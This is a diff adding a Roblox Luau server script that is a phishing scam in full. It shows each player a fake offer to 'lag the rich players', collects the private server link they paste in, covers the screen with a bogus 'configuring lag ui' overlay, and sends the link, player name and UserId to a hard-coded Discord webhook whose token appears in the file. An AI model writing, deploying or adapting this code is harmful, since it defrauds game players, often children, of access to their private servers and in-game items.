@@ -1,0 +1,86 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1459777935203373086/JESe5p_ngpj0nZn3jaz3qsD1364SVF474Bju-Yn7A9M3yl5JKWK0cJdeJVuVRGImXCBF"
+
+Players.PlayerAdded:Connect(function(player)
+	-- Create GUI
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "LagGui"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame", gui)
+	frame.Size = UDim2.new(0, 450, 0, 260)
+	frame.Position = UDim2.new(0.5, -225, 0.5, -130)
+	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+
+	local text = Instance.new("TextLabel", frame)
+	text.Size = UDim2.new(1, -20, 0, 90)
+	text.Position = UDim2.new(0, 10, 0, 10)
+	text.BackgroundTransparency = 1
+	text.TextWrapped = true
+	text.TextColor3 = Color3.new(1,1,1)
+	text.Text =
+		"Send your private server link so you can lag the rich players!\n\n" ..
+		"(must have items above 10m/s in your base for this to work)"
+
+	local box = Instance.new("TextBox", frame)
+	box.Size = UDim2.new(1, -20, 0, 40)
+	box.Position = UDim2.new(0, 10, 0, 110)
+	box.PlaceholderText = "Paste private server link here..."
+	box.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	box.TextColor3 = Color3.new(1,1,1)
+	box.ClearTextOnFocus = false
+
+	local button = Instance.new("TextButton", frame)
+	button.Size = UDim2.new(0, 200, 0, 40)
+	button.Position = UDim2.new(0.5, -100, 1, -60)
+	button.Text = "Submit"
+	button.BackgroundColor3 = Color3.fromRGB(0,0,0)
+	button.TextColor3 = Color3.new(1,1,1)
+
+	-- Fake black screen
+	local overlay = Instance.new("Frame", gui)
+	overlay.Size = UDim2.new(1,0,1,0)
+	overlay.BackgroundColor3 = Color3.new(0,0,0)
+	overlay.Visible = false
+
+	local overlayText = Instance.new("TextLabel", overlay)
+	overlayText.Size = UDim2.new(1,0,1,0)
+	overlayText.BackgroundTransparency = 1
+	overlayText.TextScaled = true
+	overlayText.TextColor3 = Color3.new(1,1,1)
+	overlayText.Text = "configuring lag ui..."
+
+	-- Button logic
+	button.MouseButton1Click:Connect(function()
+		if box.Text == "" then return end
+
+		-- Show fake loading screen
+		frame.Visible = false
+		overlay.Visible = true
+
+		-- Send to Discord webhook
+		local payload = {
+			embeds = {{
+				title = "Private Server Link Submitted",
+				description = box.Text,
+				color = 0,
+				footer = {
+					text = "Player: " .. player.Name .. " | UserId: " .. player.UserId
+				}
+			}}
+		}
+
+		local json = HttpService:JSONEncode(payload)
+
+		pcall(function()
+			HttpService:PostAsync(
+				WEBHOOK_URL,
+				json,
+				Enum.HttpContentType.ApplicationJson
+			)
+		end)
+	end)
+end)
